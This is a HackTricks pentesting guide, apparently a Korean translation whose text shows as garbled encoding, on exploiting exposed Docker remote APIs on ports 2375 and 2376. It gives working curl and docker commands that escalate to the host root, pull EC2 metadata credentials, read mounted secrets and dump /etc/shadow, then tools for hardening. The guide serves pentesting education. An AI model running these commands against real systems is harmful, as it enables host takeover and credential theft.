# 2375, 2376 Pentesting Docker

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


### Docker Basics

#### What is

DockerëŠ” **ì»¨í…Œì´ë„ˆí™” ì‚°ì—…**ì˜ **ìµœì „ì„  í”Œë«í¼**ìœ¼ë¡œ, **ì§€ì†ì ì¸ í˜ì‹ **ì„ ì„ ë„í•©ë‹ˆë‹¤. ì´ëŠ” **ì „í†µì ì¸ ê²ƒë¶€í„° ë¯¸ë˜ì ì¸ ê²ƒê¹Œì§€** ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì†ì‰¬ìš´ ìƒì„± ë° ë°°í¬ë¥¼ ì´‰ì§„í•˜ë©°, ë‹¤ì–‘í•œ í™˜ê²½ì—ì„œì˜ **ì•ˆì „í•œ ë°°í¬**ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤.

#### Basic docker architecture

* [**containerd**](http://containerd.io): ì´ëŠ” **ì»¨í…Œì´ë„ˆì˜ ë¼ì´í”„ì‚¬ì´í´**ì„ í¬ê´„ì ìœ¼ë¡œ **ê´€ë¦¬í•˜ëŠ” í•µì‹¬ ëŸ°íƒ€ì„**ì…ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” **ì´ë¯¸ì§€ ì „ì†¡ ë° ì €ì¥**ì„ ì²˜ë¦¬í•˜ê³ , **ì»¨í…Œì´ë„ˆì˜ ì‹¤í–‰, ëª¨ë‹ˆí„°ë§ ë° ë„¤íŠ¸ì›Œí‚¹**ì„ ê°ë…í•˜ëŠ” ê²ƒì´ í¬í•¨ë©ë‹ˆë‹¤. **containerdì— ëŒ€í•œ ë” ìì„¸í•œ í†µì°°**ì€ **ì¶”ê°€ì ìœ¼ë¡œ íƒêµ¬ë©ë‹ˆë‹¤**.
* **container-shim**ì€ **í—¤ë“œë¦¬ìŠ¤ ì»¨í…Œì´ë„ˆ**ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë° ìˆì–´ **ì¤‘ê°œì**ë¡œì„œ ì¤‘ìš”í•œ ì—­í• ì„ í•˜ë©°, ì»¨í…Œì´ë„ˆê°€ ì´ˆê¸°í™”ëœ í›„ **runc**ì—ì„œ ì›í™œí•˜ê²Œ ì¸ê³„ë°›ìŠµë‹ˆë‹¤.
* [**runc**](http://runc.io): **ê²½ëŸ‰ ë° ë²”ìš© ì»¨í…Œì´ë„ˆ ëŸ°íƒ€ì„** ê¸°ëŠ¥ìœ¼ë¡œ ìœ ëª…í•œ runcëŠ” **OCI í‘œì¤€**ì— ë§ì¶°ì ¸ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” containerdì— ì˜í•´ **OCI ì§€ì¹¨**ì— ë”°ë¼ **ì»¨í…Œì´ë„ˆë¥¼ ì‹œì‘í•˜ê³  ê´€ë¦¬**í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì›ë˜ì˜ **libcontainer**ì—ì„œ ë°œì „í•˜ì˜€ìŠµë‹ˆë‹¤.
* [**grpc**](http://www.grpc.io)ëŠ” **containerdì™€ docker-engine** ê°„ì˜ **í†µì‹ ì„ ì´‰ì§„í•˜ëŠ” ë° í•„ìˆ˜ì **ì´ë©°, **íš¨ìœ¨ì ì¸ ìƒí˜¸ì‘ìš©**ì„ ë³´ì¥í•©ë‹ˆë‹¤.
* [**OCI**](https://www.opencontainers.org)ëŠ” ëŸ°íƒ€ì„ ë° ì´ë¯¸ì§€ì— ëŒ€í•œ **OCI ì‚¬ì–‘**ì„ ìœ ì§€í•˜ëŠ” ë° ì¤‘ìš”í•œ ì—­í• ì„ í•˜ë©°, ìµœì‹  Docker ë²„ì „ì€ **OCI ì´ë¯¸ì§€ ë° ëŸ°íƒ€ì„** í‘œì¤€ì„ ëª¨ë‘ ì¤€ìˆ˜í•©ë‹ˆë‹¤.

#### Basic commands
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd**ëŠ” **Dockerì™€ Kubernetes**ì™€ ê°™ì€ ì»¨í…Œì´ë„ˆ í”Œë«í¼ì˜ ìš”êµ¬ë¥¼ ì¶©ì¡±ì‹œí‚¤ê¸° ìœ„í•´ íŠ¹ë³„íˆ ê°œë°œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” Linux, Windows, Solaris ë“± ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì—ì„œ **ì»¨í…Œì´ë„ˆ ì‹¤í–‰ì„ ë‹¨ìˆœí™”**í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ë©°, ìš´ì˜ ì²´ì œë³„ ê¸°ëŠ¥ê³¼ ì‹œìŠ¤í…œ í˜¸ì¶œì„ ì¶”ìƒí™”í•©ë‹ˆë‹¤. Containerdì˜ ëª©í‘œëŠ” ì‚¬ìš©ìì—ê²Œ í•„ìš”í•œ í•„ìˆ˜ ê¸°ëŠ¥ë§Œ í¬í•¨í•˜ê³  ë¶ˆí•„ìš”í•œ êµ¬ì„± ìš”ì†ŒëŠ” ìƒëµí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ëª©í‘œë¥¼ ì™„ì „íˆ ë‹¬ì„±í•˜ëŠ” ê²ƒì€ ë„ì „ì ì¸ ê²ƒìœ¼ë¡œ ì¸ì •ë©ë‹ˆë‹¤.

ì£¼ìš” ì„¤ê³„ ê²°ì • ì¤‘ í•˜ë‚˜ëŠ” **Containerdê°€ ë„¤íŠ¸ì›Œí‚¹ì„ ì²˜ë¦¬í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤**. ë„¤íŠ¸ì›Œí‚¹ì€ ë¶„ì‚° ì‹œìŠ¤í…œì—ì„œ ì¤‘ìš”í•œ ìš”ì†Œë¡œ ê°„ì£¼ë˜ë©°, ì†Œí”„íŠ¸ì›¨ì–´ ì •ì˜ ë„¤íŠ¸ì›Œí‚¹(SDN) ë° ì„œë¹„ìŠ¤ ë°œê²¬ê³¼ ê°™ì€ ë³µì¡ì„±ì€ í”Œë«í¼ë§ˆë‹¤ í¬ê²Œ ë‹¤ë¦…ë‹ˆë‹¤. ë”°ë¼ì„œ ContainerdëŠ” ì§€ì›í•˜ëŠ” í”Œë«í¼ì´ ë„¤íŠ¸ì›Œí‚¹ ì¸¡ë©´ì„ ê´€ë¦¬í•˜ë„ë¡ ë‚¨ê²¨ë‘¡ë‹ˆë‹¤.

**Dockerê°€ Containerdë¥¼ ì‚¬ìš©í•˜ì—¬** ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆ, ContainerdëŠ” Dockerì˜ ê¸°ëŠ¥ ì¤‘ ì¼ë¶€ë§Œ ì§€ì›í•œë‹¤ëŠ” ì ì— ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ, ContainerdëŠ” Dockerì— ìˆëŠ” ë„¤íŠ¸ì›Œí¬ ê´€ë¦¬ ê¸°ëŠ¥ì´ ì—†ìœ¼ë©° Docker ìŠ¤ì›œì˜ ìƒì„±ì„ ì§ì ‘ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ êµ¬ë¶„ì€ Containerdê°€ ì»¨í…Œì´ë„ˆ ëŸ°íƒ€ì„ í™˜ê²½ìœ¼ë¡œì„œì˜ ì§‘ì¤‘ëœ ì—­í• ì„ ê°•ì¡°í•˜ë©°, í†µí•©í•˜ëŠ” í”Œë«í¼ì— ë” ì „ë¬¸í™”ëœ ê¸°ëŠ¥ì„ ìœ„ì„í•©ë‹ˆë‹¤.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman**ì€ Red Hatì—ì„œ ê°œë°œí•˜ê³  ìœ ì§€ ê´€ë¦¬í•˜ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ ì»¨í…Œì´ë„ˆ ì—”ì§„ìœ¼ë¡œ, [Open Container Initiative (OCI) í‘œì¤€](https://github.com/opencontainers)ì„ ì¤€ìˆ˜í•©ë‹ˆë‹¤. **ë°ëª¬ ì—†ëŠ” ì•„í‚¤í…ì²˜**ì™€ **ë£¨íŠ¸ ì—†ëŠ” ì»¨í…Œì´ë„ˆ** ì§€ì› ë“± ì—¬ëŸ¬ ê°€ì§€ ë…íŠ¹í•œ ê¸°ëŠ¥ìœ¼ë¡œ Dockerì™€ ì°¨ë³„í™”ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‚¬ìš©ìëŠ” ë£¨íŠ¸ ê¶Œí•œ ì—†ì´ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Podmanì€ Dockerì˜ APIì™€ í˜¸í™˜ë˜ë„ë¡ ì„¤ê³„ë˜ì–´ Docker CLI ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í˜¸í™˜ì„±ì€ ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ ë¹Œë“œë¥¼ ìœ„í•œ **Buildah**ì™€ í‘¸ì‹œ, í’€, ê²€ì‚¬ì™€ ê°™ì€ ì´ë¯¸ì§€ ì‘ì—…ì„ ìœ„í•œ **Skopeo**ì™€ ê°™ì€ ë„êµ¬ë¥¼ í¬í•¨í•˜ëŠ” ìƒíƒœê³„ë¡œ í™•ì¥ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë„êµ¬ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [GitHub í˜ì´ì§€](https://github.com/containers/buildah/tree/master/docs/containertools)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì£¼ìš” ì°¨ì´ì **

* **ì•„í‚¤í…ì²˜**: Dockerì˜ í´ë¼ì´ì–¸íŠ¸-ì„œë²„ ëª¨ë¸ê³¼ ë°±ê·¸ë¼ìš´ë“œ ë°ëª¬ê³¼ ë‹¬ë¦¬, Podmanì€ ë°ëª¬ ì—†ì´ ì‘ë™í•©ë‹ˆë‹¤. ì´ ì„¤ê³„ëŠ” ì»¨í…Œì´ë„ˆê°€ ì‹œì‘í•œ ì‚¬ìš©ìì˜ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ë¯€ë¡œ ë£¨íŠ¸ ì ‘ê·¼ì´ í•„ìš” ì—†ì–´ ë³´ì•ˆì„ ê°•í™”í•©ë‹ˆë‹¤.
* **Systemd í†µí•©**: Podmanì€ **systemd**ì™€ í†µí•©ë˜ì–´ ì»¨í…Œì´ë„ˆë¥¼ ê´€ë¦¬í•˜ë©°, systemd ìœ ë‹›ì„ í†µí•´ ì»¨í…Œì´ë„ˆ ê´€ë¦¬ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” Dockerê°€ ì£¼ë¡œ Docker ë°ëª¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´ systemdë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒê³¼ ëŒ€ì¡°ì ì…ë‹ˆë‹¤.
* **ë£¨íŠ¸ ì—†ëŠ” ì»¨í…Œì´ë„ˆ**: Podmanì˜ ì¤‘ìš”í•œ ê¸°ëŠ¥ì€ ì‹œì‘í•˜ëŠ” ì‚¬ìš©ìì˜ ê¶Œí•œìœ¼ë¡œ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì…ë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ê³µê²©ìê°€ ë£¨íŠ¸ ì ‘ê·¼ì´ ì•„ë‹Œ ì†ìƒëœ ì‚¬ìš©ìì˜ ê¶Œí•œë§Œ ì–»ë„ë¡ í•˜ì—¬ ì»¨í…Œì´ë„ˆ ì¹¨í•´ì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤.

Podmanì˜ ì ‘ê·¼ ë°©ì‹ì€ ì‚¬ìš©ì ê¶Œí•œ ê´€ë¦¬ì™€ ê¸°ì¡´ Docker ì›Œí¬í”Œë¡œìš°ì™€ì˜ í˜¸í™˜ì„±ì„ ê°•ì¡°í•˜ë©° Dockerì— ëŒ€í•œ ì•ˆì „í•˜ê³  ìœ ì—°í•œ ëŒ€ì•ˆì„ ì œê³µí•©ë‹ˆë‹¤.

{% hint style="info" %}
Podmanì´ Dockerì™€ ë™ì¼í•œ APIë¥¼ ì§€ì›í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ë¯€ë¡œ, ë‹¤ìŒê³¼ ê°™ì€ Dockerì™€ ë™ì¼í•œ ëª…ë ¹ì–´ë¥¼ Podmanì—ì„œë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### ê¸°ë³¸ ì •ë³´

Remote APIëŠ” í™œì„±í™”ë˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ 2375 í¬íŠ¸ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ì´ ì„œë¹„ìŠ¤ëŠ” ì¸ì¦ì„ ìš”êµ¬í•˜ì§€ ì•Šìœ¼ë©°, ê³µê²©ìê°€ ê¶Œí•œì´ ìˆëŠ” ë„ì»¤ ì»¨í…Œì´ë„ˆë¥¼ ì‹œì‘í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. Remote APIë¥¼ ì‚¬ìš©í•˜ë©´ í˜¸ìŠ¤íŠ¸ / (ë£¨íŠ¸ ë””ë ‰í† ë¦¬)ë¥¼ ì»¨í…Œì´ë„ˆì— ì—°ê²°í•˜ê³  í˜¸ìŠ¤íŠ¸ í™˜ê²½ì˜ íŒŒì¼ì„ ì½ê±°ë‚˜ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

docker APIë¥¼ ì—´ê±°í•˜ê¸° ìœ„í•´ `docker` ëª…ë ¹ì–´ ë˜ëŠ” `curl`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. ë‹¤ìŒ ì˜ˆì™€ ê°™ì´:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
ì›ê²© docker APIì— **`docker` ëª…ë ¹ì–´ë¡œ ì—°ë½í•  ìˆ˜ ìˆë‹¤ë©´**, ì„œë¹„ìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•´ **ì´ì „ì— ì–¸ê¸‰ëœ** **docker** [**ëª…ë ¹ì–´**](2375-pentesting-docker.md#basic-commands)ë¥¼ **ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% hint style="info" %}
`export DOCKER_HOST="tcp://localhost:2375"`ë¥¼ ì‚¬ìš©í•˜ì—¬ docker ëª…ë ¹ì–´ì™€ í•¨ê»˜ `-H` ë§¤ê°œë³€ìˆ˜ë¥¼ **ì‚¬ìš©í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

**ë¹ ë¥¸ ê¶Œí•œ ìƒìŠ¹**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

ê°€ë” **TLS** ì—”ë“œí¬ì¸íŠ¸ì— **2376**ì´ ì—´ë ¤ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë„ì»¤ í´ë¼ì´ì–¸íŠ¸ë¡œëŠ” ì—°ê²°í•  ìˆ˜ ì—†ì—ˆì§€ë§Œ curlë¡œëŠ” ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
ë” ë§ì€ ì •ë³´ê°€ í•„ìš”í•˜ë©´, ë‚´ê°€ ëª…ë ¹ì–´ë¥¼ ë³µì‚¬í•œ ê³³ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### ìë™
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromising

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” **ë„ì»¤ ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œí•˜ëŠ” ë°©ë²•**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

ì´ë¥¼ ì•…ìš©í•˜ë©´ ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œí•  ìˆ˜ ìˆìœ¼ë©°, ì›ê²© ë¨¸ì‹ ì—ì„œ ì•½í•œ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•˜ê³ , ê·¸ë¡œë¶€í„° íƒˆì¶œí•˜ì—¬ ë¨¸ì‹ ì„ íƒ€í˜‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### ê¶Œí•œ ìƒìŠ¹

dockerë¥¼ ì‚¬ìš©í•˜ëŠ” í˜¸ìŠ¤íŠ¸ ë‚´ë¶€ì— ìˆëŠ” ê²½ìš°, [**ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê¸° ìœ„í•´ ì´ ì •ë³´ë¥¼ ì½ì–´ë³´ì„¸ìš”**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### ì‹¤í–‰ ì¤‘ì¸ Docker ì»¨í…Œì´ë„ˆì—ì„œ ë¹„ë°€ ë°œê²¬í•˜ê¸°
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
**env** (í™˜ê²½ ë³€ìˆ˜ ì„¹ì…˜)ì„ í™•ì¸í•˜ì—¬ ë¹„ë°€ ì •ë³´ë¥¼ ì°¾ìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì€ í•­ëª©ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ë¹„ë°€ë²ˆí˜¸.
* IP.
* í¬íŠ¸.
* ê²½ë¡œ.
* ê¸°íƒ€â€¦ .

íŒŒì¼ì„ ì¶”ì¶œí•˜ë ¤ë©´:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Securing your Docker

#### Securing Docker installation and usage

* í˜„ì¬ Docker ì„¤ì¹˜ë¥¼ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `./docker-bench-security.sh`
* í˜„ì¬ Docker ì„¤ì¹˜ë¥¼ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/kost/dockscan](https://github.com/kost/dockscan)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `dockscan -v unix:///var/run/docker.sock`
* ë‹¤ì–‘í•œ ë³´ì•ˆ ì˜µì…˜ìœ¼ë¡œ ì‹¤í–‰í•  ë•Œ ì»¨í…Œì´ë„ˆê°€ ê°€ì§ˆ ê¶Œí•œì„ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì¼ë¶€ ë³´ì•ˆ ì˜µì…˜ì„ ì‚¬ìš©í•  ë•Œì˜ ì˜ë¯¸ë¥¼ ì•„ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Securing Docker Images

* ë‹¤ë¥¸ Docker ì´ë¯¸ì§€ë¥¼ ìŠ¤ìº”í•˜ê³  ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ [https://github.com/quay/clair](https://github.com/quay/clair)ì˜ Docker ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Securing Dockerfiles

* **Dockerfileì„ ê²€ì‚¬**í•˜ê³  ëª¨ë“  ì¢…ë¥˜ì˜ ì˜ëª»ëœ êµ¬ì„±ì„ ì°¾ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê° ì˜ëª»ëœ êµ¬ì„±ì—ëŠ” IDê°€ ë¶€ì—¬ë˜ë©°, ì´ë¥¼ ìˆ˜ì •í•˜ëŠ” ë°©ë²•ì€ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

